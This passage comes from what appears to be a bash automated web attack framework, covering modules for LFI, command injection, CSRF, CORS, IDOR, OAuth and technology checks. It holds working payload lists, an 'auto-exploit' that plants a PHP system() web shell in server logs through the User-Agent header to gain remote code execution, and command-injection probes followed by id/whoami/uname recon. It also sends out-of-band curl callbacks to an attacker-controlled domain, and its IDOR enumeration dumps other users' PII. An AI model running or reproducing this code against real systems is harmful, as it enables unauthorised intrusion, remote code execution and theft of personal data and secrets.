    sort -u -o "$O/ssrf_confirmed.txt"   "$O/ssrf_confirmed.txt"   2>/dev/null || true
    sort -u -o "$O/ssrf_divergence.txt"  "$O/ssrf_divergence.txt"  2>/dev/null || true
    log_ok "SSRF confirmed: $(cnt "$O/ssrf_confirmed.txt") · candidates: $(cnt "$O/ssrf_divergence.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 12 — LFI  (detect + base64 decode + log-poison RCE)
# ══════════════════════════════════════════════════════
mod_lfi() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 12 — LFI"
    log_section "MODULE 12 — LFI DETECTION + AUTO-EXPLOIT"
    local O="$WORKSPACE/vulns/lfi"
    mkdir -p "$O/decoded" 2>/dev/null || true
    local LFI_IN="$WORKSPACE/urls/gf/lfi.txt"
    [[ ! -s "$LFI_IN" ]] && LFI_IN="$WORKSPACE/urls/urls_with_params.txt"

    active_filter "$LFI_IN" /tmp/lfi_in_$$.txt 40
    local lfi_total; lfi_total=$(wc -l < /tmp/lfi_in_$$.txt 2>/dev/null || echo 0)
    log_info "LFI: testing $lfi_total live URLs"

    local -a LFI_PAYLOADS=(
        "../../../../../../etc/passwd"
        "../../../../../etc/passwd%00"
        "....//....//....//etc/passwd"
        "..%2f..%2f..%2f..%2f..%2fetc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "/etc/passwd"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
        "file:///etc/passwd"
        "php://filter/convert.base64-encode/resource=/proc/self/environ"
        "php://filter/convert.base64-encode/resource=index.php"
        "../../../../../../proc/self/environ"
        "../../../../../../var/log/apache2/access.log"
        "../../../../../../var/log/auth.log"
        "..\\..\\..\\..\\..\\windows\\win.ini"
        "....//....//....//windows/win.ini"
        "php://input"
        "data://text/plain;base64,PD9waHAgZWNobyAnbGZpcmNlX21hcmtlcic7ID8+"
    )

    while IFS= read -r url; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local body; body=$(_curl "$furl" 2>/dev/null | head -c 4000 || true)

            # direct match
            if echo "$body" | grep -qE "root:x:0:0|\[fonts\]|for 16-bit app support|\\[extensions\\]"; then
                uniq_add "$O/lfi_confirmed.txt" "LFI_CONFIRMED: $furl"
                log_hit "LFI: $furl"
                echo "$body" > "$O/decoded/$(safe_name "$furl").body"
                continue
            fi
            # base64-wrapped PHP filter
            if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
                local dec; dec=$(echo "$body" | tr -d '\n' | base64 -d 2>/dev/null || true)
                if echo "$dec" | grep -qE "root:x:0:0|/bin/bash|application|<\?php"; then
                    uniq_add "$O/lfi_confirmed.txt" "LFI_B64: $furl"
                    log_hit "LFI (base64 filter): $furl"
                    echo "### $furl" >> "$O/decoded/decoded_dump.txt"
                    echo "$dec" >> "$O/decoded/decoded_dump.txt"
                    echo "$dec" > "$O/decoded/$(safe_name "$furl").decoded"
                    continue
                fi
            fi
            # error oracle
            if echo "$body" | grep -qiE "(failed to open stream|no such file|include\(|require\(|open_basedir|permission denied|path traversal)"; then
                uniq_add "$O/lfi_error_oracle.txt" "LFI_ORACLE: $furl [$(echo "$body" | grep -oiE '(failed to open stream|no such file|include\(|require\(|open_basedir)' | head -1)]"
            fi
        done
    done < /tmp/lfi_in_$$.txt
    rm -f /tmp/lfi_in_$$.txt

    # ── AUTO-EXPLOIT: log poisoning → RCE ─────────────
    if [[ -s "$O/lfi_confirmed.txt" ]]; then
        log_hit "LFI CONFIRMED: $(cnt "$O/lfi_confirmed.txt") → attempting log-poison RCE"
        local marker; marker="lfirce$(head -c 4 /dev/urandom | xxd -p)"
        local phpcode="<?php echo '${marker}'; system(\$_GET['c']); ?>"
        local poison_url
        # auth.log / access.log via UA injection
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            for logf in \
                "../../../../../../var/log/auth.log" \
                "../../../../../../var/log/apache2/access.log" \
                "../../../../../../var/log/nginx/access.log" \
                "../../../../../../var/log/httpd/access_log" \
                "../../../../../../proc/self/environ"; do
                # inject payload via User-Agent
                local inject_url; inject_url=$(echo "$target" | qsreplace "$logf" 2>/dev/null || true)
                _curl -A "$phpcode" --max-time 8 "$inject_url" >/dev/null 2>&1 || true
                # trigger + execute
                local rce_url="${inject_url}%3Fc%3Did"
                local out; out=$(_curl -A "$phpcode" --max-time 8 "$rce_url" 2>/dev/null | head -c 2000 || true)
                if echo "$out" | grep -qE "uid=[0-9]+|${marker}"; then
                    uniq_add "$O/lfi_rce.txt" "LFI→RCE (log poison): ${inject_url}%3Fc%3D<cmd>"
                    log_hit "LFI→RCE via $logf: $(echo "$out" | head -2 | tr '\n' ' ')"
                    echo "### $target" >> "$O/rce_output.txt"
                    echo "$out" >> "$O/rce_output.txt"
                    break
                fi
            done
        done < "$O/lfi_confirmed.txt"
    fi

    sort -u -o "$O/lfi_confirmed.txt" "$O/lfi_confirmed.txt" 2>/dev/null || true
    sort -u -o "$O/lfi_rce.txt" "$O/lfi_rce.txt" 2>/dev/null || true
    log_ok "LFI confirmed: $(cnt "$O/lfi_confirmed.txt") · RCE: $(cnt "$O/lfi_rce.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 13 — CMDi  (time-based + echo + OOB, then `id`)
# ══════════════════════════════════════════════════════
mod_cmdi() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 13 — Command Injection"
    log_section "MODULE 13 — COMMAND INJECTION (cmdi)"
    local O="$WORKSPACE/vulns/cmdi"
    mkdir -p "$O" 2>/dev/null || true
    local CMDI_IN="$WORKSPACE/urls/gf/cmdi.txt"
    [[ ! -s "$CMDI_IN" ]] && CMDI_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$CMDI_IN" ]] && { log_warn "No URL input for CMDi"; return; }

    active_filter "$CMDI_IN" /tmp/cmdi_in_$$.txt 40
    local cmdi_total; cmdi_total=$(wc -l < /tmp/cmdi_in_$$.txt 2>/dev/null || echo 0)
    log_info "CMDi: testing $cmdi_total live URLs"

    local rand_id; rand_id="cmdi$(head -c 6 /dev/urandom | xxd -p)"

    while IFS= read -r url; do
        local base; base=$(_curl -o /dev/null -w "%{time_total}" "$url" 2>/dev/null || echo "0.5")
        local base_ms; base_ms=$(echo "$base * 1000 / 1" | bc 2>/dev/null || echo 500)

        # 1) echo-marker payloads
        local -a ECHO_PAYLOADS=(
            ";echo ${rand_id}" "&&echo ${rand_id}" "|echo ${rand_id}"
            "`echo ${rand_id}`" "$(echo ${rand_id})" ";echo%20${rand_id}"
            "&echo ${rand_id}" "||echo ${rand_id}" "%0aecho ${rand_id}"
            "';echo ${rand_id};'" "\"|echo ${rand_id}\""
            "| id" "; id" "`id`" "$(id)"
        )
        for payload in "${ECHO_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local body; body=$(_curl --max-time 8 "$furl" 2>/dev/null | head -c 3000 || true)
            if echo "$body" | grep -q "$rand_id"; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [echo] (${payload}): $furl"
                log_hit "CMDi (echo): $furl :: $payload"
                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
                echo "$body" | grep -E "uid=|${rand_id}" | head -5 >> "$O/rce_output.txt"
            elif echo "$body" | grep -qE "uid=[0-9]+\(|gid=[0-9]+\(|groups?="; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [id] (${payload}): $furl"
                log_hit "CMDi (id output): $furl :: $payload"
                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
                echo "$body" | grep -E "uid=" | head -3 >> "$O/rce_output.txt"
            fi
        done

        # 2) time-based payloads
        local -a SLEEP_PAYLOADS=(
            ";sleep 5" "&sleep 5" "|sleep 5" "`sleep 5`" "$(sleep 5)"
            ";ping -c 5 127.0.0.1" "|ping -n 5 127.0.0.1"
            "||sleep 5 #" "&ping -i 5 127.0.0.1"
        )
        for payload in "${SLEEP_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local t0; t0=$(date +%s%N)
            _curl --connect-timeout 4 --max-time 15 "$furl" >/dev/null 2>&1 || true
            local t1; t1=$(date +%s%N)
            local elapsed=$(( (t1 - t0) / 1000000 ))
            if [[ "$elapsed" -ge 4000 ]] && [[ "$elapsed" -gt $(( base_ms + 3000 )) ]]; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [time] [${elapsed}ms] (${payload}): $furl"
                log_hit "CMDi (time-based ${elapsed}ms): $furl :: $payload"
            fi
        done

        # 3) OOB payloads
        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
            local rand; rand=$(head -c 6 /dev/urandom | xxd -p)
            local oob="nslookup ${rand}.${INTERACTSH_DOMAIN}"
            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            oob="curl http://${rand}.${INTERACTSH_DOMAIN}/"
            oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            uniq_add "$O/oob_payloads_sent.txt" "OOB_CMDi [${rand}.${INTERACTSH_DOMAIN}]: $url"
        fi
    done < /tmp/cmdi_in_$$.txt
    rm -f /tmp/cmdi_in_$$.txt

    sort -u -o "$O/cmdi_confirmed.txt" "$O/cmdi_confirmed.txt" 2>/dev/null || true
    if [[ -s "$O/cmdi_confirmed.txt" ]]; then
        log_hit "CMDi CONFIRMED: $(cnt "$O/cmdi_confirmed.txt") — outputs in $O/rce_output.txt"
        # full recon on confirmed: id / whoami / uname
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' || true)
            [[ -z "$target" || -z "$payload" ]] && continue
            local out; out=$(_curl --max-time 10 "$(echo "$target" | qsreplace "${payload}id;whoami;uname -a" 2>/dev/null || true)" 2>/dev/null | head -c 1500 || true)
            [[ -n "$out" ]] && { echo "### RECON $target" >> "$O/host_recon.txt"; echo "$out" >> "$O/host_recon.txt"; }
        done < "$O/cmdi_confirmed.txt"
    fi
    log_ok "CMDi confirmed: $(cnt "$O/cmdi_confirmed.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 14 — CSRF
# ══════════════════════════════════════════════════════
mod_csrf() {
    progress "MODULE 14 — CSRF"
    log_section "MODULE 14 — CSRF DETECTION"
    local O="$WORKSPACE/vulns/csrf"
    mkdir -p "$O" 2>/dev/null || true
    local FORMS_IN="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$FORMS_IN" ]] && FORMS_IN="$WORKSPACE/urls/urls_with_params.txt"

    log_info "CSRF: scanning forms for missing tokens + weak Origin checks"
    while IFS= read -r url; do
        local html; html=$(_curl --max-time 10 "$url" 2>/dev/null || true)
        # 1) token presence in forms
        local has_form; has_form=$(echo "$html" | grep -ciE "<form" || true)
        if [[ "$has_form" -gt 0 ]]; then
            local has_token; has_token=$(echo "$html" | grep -ciE 'name=["'"'"'](csrf[^"'"'"']*|_token|authenticity_token|__RequestVerificationToken|xsrf[^"'"'"']*|token)' || true)
            if [[ "$has_token" -eq 0 ]]; then
                uniq_add "$O/csrf_no_token.txt" "CSRF_NO_TOKEN [$(echo "$html" | grep -oE '<form[^>]*action="[^"]*"' | head -3 | tr '\n' ' ')]: $url"
            fi
            # form actions missing CSRF
            echo "$html" | grep -oE '<form[^>]*>' | while IFS= read -r form; do
                local method; method=$(echo "$form" | grep -oE 'method="[^"]*"' | head -1)
                if echo "$method" | grep -qiE "post|put|delete|patch"; then
                    uniq_add "$O/csrf_forms.txt" "CSRF_FORM [$(echo "$form" | tr '\n' ' ' | head -c 200)]: $url"
                fi
            done
        fi
        # 2) cookie SameSite audit
        local cookies; cookies=$(_curl -I "$url" 2>/dev/null | grep -i "^set-cookie" | head -5 || true)
        if [[ -n "$cookies" ]]; then
            while IFS= read -r ck; do
                if ! echo "$ck" | grep -qiE "samesite=(strict|lax)"; then
                    uniq_add "$O/csrf_cookies.txt" "COOKIE_NO_SAMESITE [$(echo "$ck" | cut -c1-120)]: $url"
                fi
            done <<< "$cookies"
        fi
        # 3) Origin/Referer enforcement on state-changing endpoints
        if echo "$url" | grep -qiE "(login|logout|password|email|profile|settings|delete|update|transfer|pay|admin|account)"; then
            local r200 r400
            r200=$(_curl -X POST -H "Origin: https://${DOMAIN}"    -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
            r400=$(_curl -X POST -H "Origin: https://evil.com"     -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
            if [[ "$r400" != "403" && "$r400" != "400" && "$r400" != "406" ]] && [[ "$r200" =~ ^(200|201|204|302)$ ]]; then
                uniq_add "$O/csrf_origin_weak.txt" "CSRF_ORIGIN_WEAK [same:${r200}/evil:${r400}]: $url"
            fi
        fi
    done < <(head -120 "$FORMS_IN" 2>/dev/null)

    sort -u -o "$O/csrf_no_token.txt" "$O/csrf_no_token.txt" 2>/dev/null || true
    sort -u -o "$O/csrf_origin_weak.txt" "$O/csrf_origin_weak.txt" 2>/dev/null || true
    [[ -s "$O/csrf_no_token.txt" ]]    && log_hit "CSRF missing tokens: $(cnt "$O/csrf_no_token.txt")"
    [[ -s "$O/csrf_origin_weak.txt" ]] && log_hit "CSRF weak Origin checks: $(cnt "$O/csrf_origin_weak.txt")"
    log_ok "CSRF scan complete"
}

# ══════════════════════════════════════════════════════
# MODULE 15 — CORS  (reflect + null-origin + credentials)
# ══════════════════════════════════════════════════════
mod_cors() {
    progress "MODULE 15 — CORS"
    log_section "MODULE 15 — CORS MISCONFIGURATION"
    local O="$WORKSPACE/vulns/cors"
    mkdir -p "$O" 2>/dev/null || true
    local CORS_IN="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$CORS_IN" ]] && CORS_IN="$WORKSPACE/subdomains/live_urls.txt"

    log_info "CORS: testing ${CORS_IN} with evil origins"
    local evil="https://evil.com"
    local evil_sub="https://${DOMAIN}.evil.com"
    local evil_suffix="https://evil${DOMAIN}"

    while IFS= read -r url; do
        for origin in "$evil" "$evil_sub" "$evil_suffix" "null"; do
            local headers; headers=$(_curl -H "Origin: $origin" -I "$url" 2>/dev/null || true)
            local acao; acao=$(echo "$headers" | grep -i "^access-control-allow-origin" | tr -d '\r' | head -1 || true)
            local acac; acac=$(echo "$headers" | grep -i "^access-control-allow-credentials" | tr -d '\r' | head -1 || true)

            if [[ -n "$acao" ]]; then
                local reflected="no"
                echo "$acao" | grep -qi "$origin" && reflected="yes"
                if [[ "$reflected" == "yes" ]] || echo "$acao" | grep -qi "null"; then
                    if echo "$acac" | grep -qi "true"; then
                        uniq_add "$O/cors_confirmed.txt" "CORS_CRED [${origin}] [${acao}] [${acac}]: $url"
                        log_hit "CORS CREDENTIALED [${origin}]: $url"
                    else
                        uniq_add "$O/cors_reflect.txt" "CORS_REFLECT [${origin}] [${acao}]: $url"
                        log_warn "CORS reflected (no creds): $url"
                    fi
                fi
            fi
        done
    done < <(head -150 "$CORS_IN" 2>/dev/null)

    sort -u -o "$O/cors_confirmed.txt" "$O/cors_confirmed.txt" 2>/dev/null || true
    sort -u -o "$O/cors_reflect.txt"   "$O/cors_reflect.txt"   2>/dev/null || true
    [[ -s "$O/cors_confirmed.txt" ]] && log_hit "CORS confirmed: $(cnt "$O/cors_confirmed.txt")"
    log_ok "CORS scan complete"
}

# ══════════════════════════════════════════════════════
# MODULE 16 — IDOR  (sequential diff + auto-enum)
# ══════════════════════════════════════════════════════
mod_idor() {
    progress "MODULE 16 — IDOR"
    log_section "MODULE 16 — IDOR / INSECURE DIRECT OBJECT REFERENCE"
    local O="$WORKSPACE/vulns/idor"
    mkdir -p "$O" 2>/dev/null || true
    local IDOR_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$IDOR_IN" ]] && IDOR_IN="$WORKSPACE/endpoints/all_endpoints.txt"
    [[ ! -s "$IDOR_IN" ]] && { log_warn "No URLs for IDOR"; return; }

    log_info "IDOR: extracting numeric IDs from URLs/endpoints..."
    local -A seen_ids
    grep -hoE '(id|ID|user|uid|account|acc|order|invoice|ticket|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|room|chat|conversation|payment|transaction|subscription|org|team|project|repo|issue|pr|review)(=|/)[0-9]{1,12}' \
        "$IDOR_IN" "$WORKSPACE/js/"*.txt "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null \
        | sort -u > /tmp/idor_parsed_$$.txt || true

    # param-style: /path?id=123  → id
    grep -oE 'https?://[^ ]*[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' \
        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_param_urls.txt" || true
    # path-style: /api/users/123
    grep -oE 'https?://[^ ]*(/users?|/accounts?|/orders?|/invoices?|/files?|/documents?|/profiles?|/members?|/clients?|/customers?|/products?|/posts?|/messages?|/payments?|/transactions?|/orgs?|/teams?|/projects?|/repos?|/issues?|/pulls?|/reviews?)/[0-9]{1,12}' \
        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_path_urls.txt" || true

    local n_param; n_param=$(wc -l < "$O/idor_param_urls.txt" 2>/dev/null || echo 0)
    local n_path;  n_path=$(wc -l < "$O/idor_path_urls.txt" 2>/dev/null || echo 0)
    log_info "IDOR targets: $n_param param-style + $n_path path-style"

    # ── sequential diffing: param-style ────────────────
    while IFS= read -r url; do
        local orig_id; orig_id=$(echo "$url" | grep -oE '[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' | head -1)
        local pname; pname=$(echo "$orig_id" | grep -oE '^[?&][a-zA-Z_]+' | tr -d '?&')
        local pval;  pval=$(echo "$orig_id" | grep -oE '[0-9]+$')
        [[ -z "$pname" || -z "$pval" ]] && continue
        [[ -n "${seen_ids[${pname}:${pval}]:-}" ]] && continue
        seen_ids["${pname}:${pval}"]=1

        local base; base=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$url" 2>/dev/null || echo "000 0")
        local b_code; b_code=$(echo "$base" | cut -d' ' -f1)
        local b_size; b_size=$(echo "$base" | cut -d' ' -f2)
        local b_body; b_body=$(_curl "$url" 2>/dev/null | head -c 800 || true)
        local b_hash; b_hash=$(echo "$b_body" | md5sum | cut -d' ' -f1)
        local b_haspii; b_haspii=$(echo "$b_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)

        for delta in "-2" "-1" "+1" "+2" "+1000" "+999999"; do
            local new_id=$(( pval + delta ))
            [[ "$new_id" -lt 1 ]] && continue
            local fuzz; fuzz=$(echo "$url" | sed "s/\([?&]${pname}=\)[0-9]*/\1${new_id}/")
            local resp; resp=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$fuzz" 2>/dev/null || echo "000 0")
            local r_code; r_code=$(echo "$resp" | cut -d' ' -f1)
            local r_size; r_size=$(echo "$resp" | cut -d' ' -f2)
            local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
            local r_hash; r_hash=$(echo "$r_body" | md5sum | cut -d' ' -f1)
            local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)

            if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_hash" != "$b_hash" ]] && \
               { [[ "$r_haspii" -gt 0 ]] || [[ "$r_size" -gt "$b_size" ]]; }; then
                uniq_add "$O/idor_seq_diff.txt" "IDOR [${pname}=${pval}→${new_id}] [${b_code}/${b_size}b → ${r_code}/${r_size}b] [PII:${r_haspii}]: $fuzz"
                log_hit "IDOR candidate: $fuzz (${b_size}b → ${r_size}b)"
                # AUTO-EXPLOIT: dump the foreign object
                echo "### $fuzz" >> "$O/idor_dump.txt"
                echo "$r_body" >> "$O/idor_dump.txt"
            fi
        done
    done < "$O/idor_param_urls.txt"

    # ── path-style sequential ──────────────────────────
    while IFS= read -r url; do
        local orig_id; orig_id=$(echo "$url" | grep -oE '/[0-9]{1,12}$' | tr -d '/')
        [[ -z "$orig_id" ]] && continue
        local new_id=$(( orig_id + 1 ))
        local fuzz; fuzz=$(echo "$url" | sed "s|/[0-9]\{1,12\}$|/${new_id}|")
        local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
        local r_code; r_code=$(_curl -o /dev/null -w "%{http_code}" "$fuzz" 2>/dev/null || echo 000)
        local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)
        if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_haspii" -gt 0 ]] && \
           ! echo "$r_body" | grep -qiE "(not found|unauthorized|forbidden|permission)"; then
            uniq_add "$O/idor_seq_diff.txt" "IDOR_PATH [${orig_id}→${new_id}] [$r_code] [PII:${r_haspii}]: $fuzz"
            log_hit "IDOR path candidate: $fuzz"
            echo "### $fuzz" >> "$O/idor_dump.txt"
            echo "$r_body" >> "$O/idor_dump.txt"
        fi
    done < "$O/idor_path_urls.txt"

    rm -f /tmp/idor_parsed_$$.txt
    sort -u -o "$O/idor_seq_diff.txt" "$O/idor_seq_diff.txt" 2>/dev/null || true
    sort -u -o "$O/idor_dump.txt" "$O/idor_dump.txt" 2>/dev/null || true
    if [[ -s "$O/idor_seq_diff.txt" ]]; then
        log_hit "IDOR confirmed candidates: $(cnt "$O/idor_seq_diff.txt") — dumps in idor_dump.txt"
        grep -c "IDOR" "$O/idor_seq_diff.txt" 2>/dev/null | xargs -I{} cp "$O/idor_seq_diff.txt" "$O/idor_confirmed.txt" 2>/dev/null || true
    fi
    log_ok "IDOR scan complete"
}

# ══════════════════════════════════════════════════════
# MODULE 17 — OAUTH / SSO  (redirect_uri, state, token leak)
# ══════════════════════════════════════════════════════
mod_oauth() {
    progress "MODULE 17 — OAuth / SSO"
    log_section "MODULE 17 — OAUTH / SSO MISCONFIGURATION"
    local O="$WORKSPACE/vulns/oauth"
    mkdir -p "$O" 2>/dev/null || true

    # discover OAuth endpoints from JS + endpoints + known paths
    local oauth_src="$WORKSPACE/js/all_js_endpoints.txt $WORKSPACE/endpoints/all_endpoints.txt $WORKSPACE/js/oauth.txt"
    grep -hoE 'https?://[^"'"'"' ]*(/oauth/[a-zA-Z/]*|/authorize[^"'"'"' ]*|/token[^"'"'"' ]*|/connect/[a-zA-Z/]*|/oidc/[a-zA-Z/]*|/sso/[a-zA-Z/]*|/saml/[a-zA-Z/]*)' \
        $oauth_src 2>/dev/null | sort -u > "$O/oauth_endpoints.txt" || true

    local OAUTH_CAND="$O/oauth_endpoints.txt"
    if [[ ! -s "$OAUTH_CAND" ]]; then
        log_info "No OAuth endpoints in JS/endpoints — probing known paths on main host..."
        for p in /oauth/authorize /oauth/token /authorize /token /connect/authorize \
                 /api/oauth/authorize /api/oauth/token /oidc/authorize /oidc/token /sso/login /login/oauth/authorize; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "https://$DOMAIN$p" 2>/dev/null || echo 000)
            [[ "$c" != "000" && "$c" != "404" ]] && uniq_add "$OAUTH_CAND" "https://$DOMAIN$p [$c]"
        done
        sort -u -o "$OAUTH_CAND" "$OAUTH_CAND" 2>/dev/null || true
    fi
    log_info "OAuth endpoints: $(cnt "$OAUTH_CAND")"

    local evil_redirect="${INTERACTSH_DOMAIN:-evil.com}"

    while IFS= read -r line; do
        local url; url=$(echo "$line" | grep -oP 'https?://\S+' | head -1)
        [[ -z "$url" ]] && continue

        # 1) redirect_uri open-redirect / host confusion
        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
            for ru in \
                "https://${evil_redirect}/" \
                "https://${evil_redirect}/$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)" \
                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1).${evil_redirect}/" \
                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)@${evil_redirect}/" \
                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)/%2f%2f${evil_redirect}" \
                "javascript:alert(1)" \
                "//${evil_redirect}/" \
                "https://${evil_redirect}%2f%2f$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)"; do
                local test_url; test_url=$(echo "$url" | sed 's|\(redirect_uri=\|redirect_uri%3d\|return_uri=\|callback=\|next=\|continue=\|returnTo=\|redirect=\).*|\1'"$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$ru" 2>/dev/null || echo "$ru")"'|')
                local loc; loc=$(_curl -o /dev/null -w "%{redirect_url}" --max-time 8 "$test_url" 2>/dev/null || true)
                if echo "$loc" | grep -qiE "${evil_redirect}|javascript:"; then
                    uniq_add "$O/oauth_redirect_uri.txt" "OAUTH_REDIRECT_URI_OPEN [→ ${loc}]: $test_url"
                    log_hit "OAuth redirect_uri open redirect: $test_url → $loc"
                fi
            done
        fi

        # 2) missing state param on authorize
        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
            if ! echo "$url" | grep -qiE "state="; then
                uniq_add "$O/oauth_no_state.txt" "OAUTH_NO_STATE (login-CSRF risk): $url"
            fi
        fi

        # 3) implicit-flow token leak check (fragment vs query)
        if echo "$url" | grep -qE "(response_type=token|response_type%3dtoken)"; then
            uniq_add "$O/oauth_implicit.txt" "OAUTH_IMPLICIT_FLOW (token in fragment — leak via Referer/history): $url"
        fi

        # 4) client_secret / client_id exposure in JS
        local js_all; js_all=$(cat "$WORKSPACE/js/"*.txt 2>/dev/null | head -c 2000000)
        echo "$js_all" | grep -oE '"(client_secret|clientSecret|client_secret_id|secret_key|api_secret)"\s*[:=]\s*"[^"]{8,}"' \
            | sort -u > "$O/oauth_secrets_in_js.txt" || true
    done < "$OAUTH_CAND"

    # post-processing: dedupe secrets from JS
    grep -hoE '"(client_secret|clientSecret|client_secret_id|secret_key|api_secret|consumer_secret)"\s*[:=]\s*"[^"]{8,}"' \
        "$WORKSPACE/js/"*.txt 2>/dev/null | sort -u >> "$O/oauth_secrets_in_js.txt" 2>/dev/null || true
    sort -u -o "$O/oauth_secrets_in_js.txt" "$O/oauth_secrets_in_js.txt" 2>/dev/null || true
    [[ -s "$O/oauth_secrets_in_js.txt" ]] && log_hit "OAuth secrets leaked in JS: $(cnt "$O/oauth_secrets_in_js.txt")"
    [[ -s "$O/oauth_redirect_uri.txt" ]] && log_hit "OAuth redirect_uri open: $(cnt "$O/oauth_redirect_uri.txt")"
    log_ok "OAuth scan complete"
}
# ══════════════════════════════════════════════════════
# MODULE 18 — TECHNOLOGY-SPECIFIC CHECKS
# ══════════════════════════════════════════════════════
mod_tech() {
    progress "MODULE 18 — Technology-Specific Checks"
    log_section "MODULE 18 — TECHNOLOGY-SPECIFIC VULNERABILITY CHECKS"
    local O="$WORKSPACE/vulns/tech"
    mkdir -p "$O" 2>/dev/null || true
    local TECHS="$WORKSPACE/subdomains/tech_stack.txt"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    [[ ! -s "$TECHS" ]] && { log_warn "No tech stack data — running quick httpx re-fingerprint"; ensure_live; }

    # Which technologies are present?
    local techs_lc; techs_lc=$(tr '[:upper:]' '[:lower:]' < "$TECHS" 2>/dev/null)

    # ── WordPress ─────────────────────────────────────
    if echo "$techs_lc" | grep -q "wordpress"; then
        log_info "WordPress detected — probing xmlrpc + user enumeration + wp-json"
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            local xmlrpc_code; xmlrpc_code=$(_curl -X POST -H "Content-Type: text/xml" \
                -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
                -o /dev/null -w "%{http_code}" "$host/xmlrpc.php" 2>/dev/null || echo 000)
            [[ "$xmlrpc_code" == "200" ]] && \
                uniq_add "$O/wordpress.txt" "WORDPRESS_XMLRPC_ENABLED (brute-force/amplification): $host/xmlrpc.php" && \
                log_hit "WordPress xmlrpc.php enabled: $host/xmlrpc.php"

            local users; users=$(_curl "$host/wp-json/wp/v2/users" 2>/dev/null | head -c 2000 || true)
            echo "$users" | grep -qE '"slug"|"name"' && \
                uniq_add "$O/wordpress.txt" "WORDPRESS_USER_ENUM: $host/wp-json/wp/v2/users" && \
                log_hit "WordPress user enumeration: $host/wp-json/wp/v2/users"

            local upd; upd=$(_curl -o /dev/null -w "%{http_code}" "$host/wp-json/wp/v2/users?role=administrator" 2>/dev/null || echo 000)
            [[ "$upd" == "200" ]] && \
                uniq_add "$O/wordpress.txt" "WORDPRESS_ADMIN_ENUM: $host/wp-json/wp/v2/users?role=administrator"
        done
    fi

    # ── Laravel ───────────────────────────────────────
    if echo "$techs_lc" | grep -q "laravel"; then
        log_info "Laravel detected — checking APP_DEBUG / .env exposure"
        for host in $(head -5 "$LIVE" 2>/dev/null); do
            local dbg; dbg=$(_curl "$host/_ignition/execute-solution" 2>/dev/null | head -c 500 || true)
            echo "$dbg" | grep -qiE "(ignition|laravel|exception)" && \
